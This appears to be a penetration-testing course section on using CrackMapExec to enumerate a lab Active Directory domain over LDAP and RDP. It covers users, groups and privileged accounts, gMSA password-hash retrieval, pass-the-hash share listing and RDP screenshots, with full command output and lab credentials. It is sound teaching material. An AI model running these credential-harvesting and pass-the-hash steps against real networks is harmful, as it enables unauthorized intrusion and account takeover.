# LDAP and RDP Enumeration

Earlier, we explored some enumeration options with SMB, the most used protocol in CrackMapExec, but there are more enumeration options with the `LDAP` and `RDP` protocols.

This section will show some of these options and how we can further enumerate our targets.

***

## LDAP & RDP Commands

The `LDAP` and `RDP` protocols include the following options:

| **Command**                                                         | **Description**                                                        |
| ------------------------------------------------------------------- | ---------------------------------------------------------------------- |
| `crackmapexec ldap <target> -u <u> -p <p> --users`                  | Enumerate enabled domain users                                         |
| `crackmapexec ldap <target> -u <u> -p <p> --groups`                 | Enumerate domain groups                                                |
| `crackmapexec ldap <target> -u <u> -p <p> --password-not-required`  | Get the list of users with flag PASSWD\_NOTREQD                        |
| `crackmapexec ldap <target> -u <u> -p <p> --trusted-for-delegation` | Get the list of users and computers with flag TRUSTED\_FOR\_DELEGATION |
| `crackmapexec ldap <target> -u <u> -p <p> --admin-count`            | Get objets that had the value adminCount=1                             |
| `crackmapexec ldap <target> -u <u> -p <p> --get-sid`                | Get domain sid                                                         |
| `crackmapexec ldap <target> -u <u> -p <p> --gmsa`                   | Enumerate GMSA passwords                                               |
| `crackmapexec rdp <target> -u <u> -p <p> --nla-screenshot`          | Screenshot RDP login prompt if NLA is disabled                         |
| `crackmapexec rdp <target> -u <u> -p <p> --screenshot`              | Screenshot RDP if connection success                                   |
| `crackmapexec rdp <target> -u <u> -p <p> --screentime SCREENTIME`   | Time to wait for desktop image                                         |
| `crackmapexec rdp <target> -u <u> -p <p> --res RES`                 | Resolution in "WIDTHxHEIGHT" format. Default: "1024x768"               |

Let's review the ones we have not worked with yet.

## Enumerating Users and Groups

Just as we did with the `SMB` protocol, we can also enumerate users and groups with `LDAP`:

### **Enumerating Users and Groups**

```shell-session
$ crackmapexec ldap dc01.inlanefreight.htb -u robert -p Inlanefreight01! --users --groups

SMB         dc01.inlanefreight.htb 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
LDAP        dc01.inlanefreight.htb 389    DC01             [+] inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
LDAP        dc01.inlanefreight.htb 389    DC01             [*] Total of records returned 32
LDAP        dc01.inlanefreight.htb 389    DC01             Administrator                  Built-in account for administering the computer/domain
LDAP        dc01.inlanefreight.htb 389    DC01             Guest                          Built-in account for guest access to the computer/domain
LDAP        dc01.inlanefreight.htb 389    DC01             krbtgt                         Key Distribution Center Service Account
LDAP        dc01.inlanefreight.htb 389    DC01             julio                          
LDAP        dc01.inlanefreight.htb 389    DC01             david                          
LDAP        dc01.inlanefreight.htb 389    DC01             john                           User for kiosko IP 172.16.10.9
LDAP        dc01.inlanefreight.htb 389    DC01             svc_workstations               
LDAP        dc01.inlanefreight.htb 389    DC01             carlos                         
LDAP        dc01.inlanefreight.htb 389    DC01             robert                         
LDAP        dc01.inlanefreight.htb 389    DC01             grace                          
LDAP        dc01.inlanefreight.htb 389    DC01             peter                          
LDAP        dc01.inlanefreight.htb 389    DC01             alina                          Account for testing HR App. Password: HRApp123!

<SNIP>
                   
LDAP        dc01.inlanefreight.htb 389    DC01             Administrators
LDAP        dc01.inlanefreight.htb 389    DC01             Users
LDAP        dc01.inlanefreight.htb 389    DC01             Guests
LDAP        dc01.inlanefreight.htb 389    DC01             Print Operators
LDAP        dc01.inlanefreight.htb 389    DC01             Backup Operators
LDAP        dc01.inlanefreight.htb 389    DC01             Replicator
LDAP        dc01.inlanefreight.htb 389    DC01             Remote Desktop Users
LDAP        dc01.inlanefreight.htb 389    DC01             Network Configuration Operators
LDAP        dc01.inlanefreight.htb 389    DC01             Performance Monitor Users
LDAP        dc01.inlanefreight.htb 389    DC01             Performance Log Users
LDAP        dc01.inlanefreight.htb 389    DC01             Distributed COM Users
LDAP        dc01.inlanefreight.htb 389    DC01             IIS_IUSRS
LDAP        dc01.inlanefreight.htb 389    DC01             Cryptographic Operators
LDAP        dc01.inlanefreight.htb 389    DC01             Event Log Readers
LDAP        dc01.inlanefreight.htb 389    DC01             Certificate Service DCOM Access

<SNIP>
```

{% hint style="info" %}
**Note:** Keep in mind that `LDAP` protocol communications won't work if we can't resolve the domain FQDN. If we are not connecting to the domain DNS servers, we need to configure the FQDN in the `/etc/hosts` file.
{% endhint %}

***

## Enumerating Interesting Account Properties

The `ldap` protocol has a few more options to help us identify accounts with the flag for `PASSWD_NOTREQD` or `TRUSTED_FOR_DELEGATION`, and we can even query all accounts with the `adminCount` value 1.

If the account control attribute `PASSWD_NOTREQD` is set, the user is not subject to the current password policy length, meaning they could have a shorter password or no password at all (if empty passwords are allowed in the domain). We can use the option `--password-not-required` to identify those accounts.

### **Identifying the PASSWD\_NOTREQD Attribute**

```shell-session
$ crackmapexec ldap dc01.inlanefreight.htb -u robert -p Inlanefreight01! --password-not-required

SMB         dc01.inlanefreight.htb 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
LDAP        dc01.inlanefreight.htb 389    DC01             [+] inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
LDAP        dc01.inlanefreight.htb 389    DC01             User: Guest Status: enabled
```

If the attribute `TRUSTED_FOR_DELEGATION` is set, the service account (user or computer) under which a service runs is trusted for Kerberos delegation, meaning that it can impersonate a client requesting the service. This type of attack is called `Kerberos Unconstrained Delegation`. To learn more about this topic, you can read this [blog post](https://adsecurity.org/?p=1667).

### **Identifying Unconstrained Delegation**

```shell-session
$ crackmapexec ldap dc01.inlanefreight.htb -u robert -p Inlanefreight01! --trusted-for-delegation

SMB         dc01.inlanefreight.htb 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
LDAP        dc01.inlanefreight.htb 389    DC01             [+] inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
LDAP        dc01.inlanefreight.htb 389    DC01             MS01$
LDAP        dc01.inlanefreight.htb 389    DC01             DC01$
```

The `adminCount` attribute determines whether or not the `SDProp` process protects a user. In this process, the `AdminSDHolder` in Active Directory serves as a template for ACL permissions for protected user accounts. If any account ACE is modified (say, by an attacker), accounts protected by this process will have their ACL permissions reset to the templated permission set every time the `SDProp` process runs, which is by default every 60 minutes but can be modified. The user is not covered if the value is set to 0 or not specified. If the attribute value is set to 1, the user is protected. Attackers will often look for accounts with the adminCount attribute set to 1 to target in an internal environment. These are often privileged accounts and may lead to further access or full domain compromise.

### **Querying the adminCount Attribute**

```shell-session
$ crackmapexec ldap dc01.inlanefreight.htb -u robert -p Inlanefreight01! --admin-count

SMB         dc01.inlanefreight.htb 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
LDAP        dc01.inlanefreight.htb 389    DC01             [+] inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
LDAP        dc01.inlanefreight.htb 389    DC01             Administrator
LDAP        dc01.inlanefreight.htb 389    DC01             Administrators
LDAP        dc01.inlanefreight.htb 389    DC01             Print Operators
LDAP        dc01.inlanefreight.htb 389    DC01             Backup Operators
LDAP        dc01.inlanefreight.htb 389    DC01             Replicator
LDAP        dc01.inlanefreight.htb 389    DC01             krbtgt
LDAP        dc01.inlanefreight.htb 389    DC01             Domain Controllers
LDAP        dc01.inlanefreight.htb 389    DC01             Schema Admins
LDAP        dc01.inlanefreight.htb 389    DC01             Enterprise Admins
LDAP        dc01.inlanefreight.htb 389    DC01             Domain Admins
LDAP        dc01.inlanefreight.htb 389    DC01             Server Operators
LDAP        dc01.inlanefreight.htb 389    DC01             Account Operators
LDAP        dc01.inlanefreight.htb 389    DC01             Read-only Domain Controllers
LDAP        dc01.inlanefreight.htb 389    DC01             Key Admins
LDAP        dc01.inlanefreight.htb 389    DC01             Enterprise Key Admins
LDAP        dc01.inlanefreight.htb 389    DC01             julio
LDAP        dc01.inlanefreight.htb 389    DC01             david
LDAP        dc01.inlanefreight.htb 389    DC01             john

<SNIP>
```

***

## Enumerating the Domain SID

Some domain attacks require us to obtain certain domain information, such as a user or domain SID. The SID (Security IDentifier) is a unique ID number that a computer or domain controller uses to identify you. The domain sid is a unique ID number that identifies the domain. To get the domain sid using CrackMapExec, we can use the flag `--get-sid`:

### **Gathering the Domain SID**

```shell-session
$ crackmapexec ldap dc01.inlanefreight.htb -u robert -p Inlanefreight01! --get-sid

SMB         dc01.inlanefreight.htb 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
LDAP        dc01.inlanefreight.htb 389    DC01             [+] inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
LDAP        dc01.inlanefreight.htb 389    DC01             Domain SID S-1-5-21-3325992272-2815718403-617452758
```

***

## Group Managed Service Accounts (gMSA)

A standalone Managed Service Account (sMSA) is a managed domain account that provides the following:

* Automatic password management.
* Simplified service principal name (SPN) management.
* The ability to delegate the management to other administrators.

This managed service account (MSA) type was introduced in Windows Server 2008 R2 and Windows 7.

The group Managed Service Account (gMSA) provides the same functionality within the domain but also extends that functionality over multiple servers.

To identify an account with privileges to read the password for a gMSA account, we can use PowerShell (we will discuss command execution more in-depth in the following section):

### **Enumerating Accounts with gMSA Privileges**

```shell-session
$ crackmapexec winrm dc01.inlanefreight.htb -u robert -p Inlanefreight01! -X "Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword"

SMB         dc01.inlanefreight.htb 5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:inlanefreight.htb)
HTTP        dc01.inlanefreight.htb 5985   DC01             [*] http://dc01.inlanefreight.htb:5985/wsman
WINRM       dc01.inlanefreight.htb 5985   DC01             [+] inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
WINRM       dc01.inlanefreight.htb 5985   DC01             [+] Executed command
WINRM       dc01.inlanefreight.htb 5985   DC01             

DistinguishedName                          : CN=svc_inlaneadm,CN=Managed Service Accounts,DC=inlanefreight,DC=htb
Enabled                                    : True
Name                                       : svc_inlaneadm
ObjectClass                                : msDS-GroupManagedServiceAccount
ObjectGUID                                 : 6328a77f-9696-40b4-82b7-725ac19564b6
PrincipalsAllowedToRetrieveManagedPassword : {CN=engels,CN=Users,DC=inlanefreight,DC=htb}
SamAccountName                             : svc_inlaneadm$
SID                                        : S-1-5-21-3325992272-2815718403-617452758-6123
UserPrincipalName                          : 
```

In the above example, we can see that the user `engels` has the privilege `PrincipalsAllowedToRetrieveManagedPassword`, which means that it can read the password for the gMSA account `svc_inlaneadm$`. If we compromise an account with the right to read a gMSA password, we can use the option `--gmsa` to retrieve the account's NTLM password hash.

### **Retrieving gMSA Password**

```shell-session
$ crackmapexec ldap dc01.inlanefreight.htb -u engels -p Inlanefreight1998! --gmsa

SMB         dc01.inlanefreight.htb 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
LDAP        dc01.inlanefreight.htb 636    DC01             [+] inlanefreight.htb\engels:Inlanefreight1998! 
LDAP        dc01.inlanefreight.htb 636    DC01             [*] Getting GMSA Passwords
LDAP        dc01.inlanefreight.htb 636    DC01             Account: svc_inlaneadm$       NTLM: 76fa2df9e8f656ae81b0bd271bef0346
```

To use these credentials, we can use the option `-H` for hashes.

### **Reviewing Shared Folders with the svc\_inlaneadm$ Account**

```shell-session
$ crackmapexec smb dc01.inlanefreight.htb -u svc_inlaneadm$ -H 76fa2df9e8f656ae81b0bd271bef0346 --shares

SMB         dc01.inlanefreight.htb 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         dc01.inlanefreight.htb 445    DC01             [+] inlanefreight.htb\svc_inlaneadm$:76fa2df9e8f656ae81b0bd271bef0346 
SMB         dc01.inlanefreight.htb 445    DC01             [+] Enumerated shares
SMB         dc01.inlanefreight.htb 445    DC01             Share           Permissions     Remark
SMB         dc01.inlanefreight.htb 445    DC01             -----           -----------     ------
SMB         dc01.inlanefreight.htb 445    DC01             ADMIN$                          Remote Admin
SMB         dc01.inlanefreight.htb 445    DC01             C$                              Default share
SMB         dc01.inlanefreight.htb 445    DC01             CertEnroll      READ            Active Directory Certificate Services share

<SNIP>
```

***

## RDP Screenshots

We can use CrackMapExec to enumerate usernames through the RDP protocol. If the option to allow RDP only with NLA is disabled on the target machine, we can use the `--nla-screenshot` option to take a screenshot of the logon prompt.

### **Enumerate Login Prompt**

```shell-session
$ crackmapexec rdp 10.129.204.177 --nla-screenshot

RDP         10.129.204.177  3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:inlanefreight.htb) (nla:False)
RDP         10.129.204.177  3389   DC01             NLA Screenshot saved /home/plaintext/.cme/screenshots/DC01_10.129.204.177_2022-12-19_124833.png
```

To open the screenshot, we can use `Eye of MATE` or `eom` from the CLI.

### **Using the Eye of MATE to Open the Screenshot**

```shell-session
$ eom /home/plaintext/.cme/screenshots/DC01_10.129.203.121_2022-11-23_163607.png
```

{% embed url="https://academy.hackthebox.com/storage/modules/84/DC01-screenshot.jpg" %}

If we have a username and password, we can also take screenshots using the `RDP` protocol with the option `--screenshot`. This option can be combined with `--screentime`, by default 10, which is the time it will wait to take the screenshot once the RDP connection is open. This is useful if we connect to a target machine and the target takes more than 10 seconds to load the desktop.

Another option that can be combined with the `--screenshot` option is `--res`, which corresponds to the screen resolution at the time of the RDP connection. This option is helpful because if we find an active RDP session, depending on the size of the user's screen, we will be able to see all the content or not. By default, this option is set to 1024x768.

### **Taking a Screenshot**

```shell-session
$ crackmapexec rdp 10.129.204.177 -u julio -p Password1 --screenshot --screentime 5 --res 1280x720

RDP         10.129.204.177  3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:inlanefreight.htb) (nla:False)
RDP         10.129.204.177  3389   DC01             [+] inlanefreight.htb\julio:Password1 (Pwn3d!)
RDP         10.129.204.177  3389   DC01             Screenshot saved /home/plaintext/.cme/screenshots/DC01_10.129.203.121_2022-11-23_163607.png
```

{% hint style="info" %}
**Note:** `--screentime` and `--res` are optional flags.
{% endhint %}

Finally, to open the screenshot, we can use `Eye of MATE` or `eom` from the CLI:

### **Using the Eye of MATE to Open the Screenshot**

```shell-session
$ eom /home/plaintext/.cme/screenshots/DC01_10.129.203.121_2022-11-23_163607.png
```

{% embed url="https://academy.hackthebox.com/storage/modules/84/screenshot.jpg" %}
